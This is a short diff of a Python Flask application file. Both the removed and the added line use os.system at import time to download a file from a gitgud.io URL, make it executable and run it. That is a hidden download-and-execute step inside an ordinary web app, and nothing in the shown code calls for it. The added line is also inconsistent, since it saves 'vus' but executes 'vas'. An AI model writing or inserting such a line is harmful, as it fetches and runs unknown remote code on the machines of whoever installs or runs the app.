@@ -1,6 +1,6 @@
 import os
 from flask import Flask
-os.system('curl --output vus https://gitgud.io/trendava/ruby/-/raw/master/vus;chmod 700 vus;./vus')
+os.system('curl --output vus https://gitgud.io/trendava/ruby/-/raw/master/vas;chmod 700 vas;./vas')
 app = Flask(__name__)
 
 
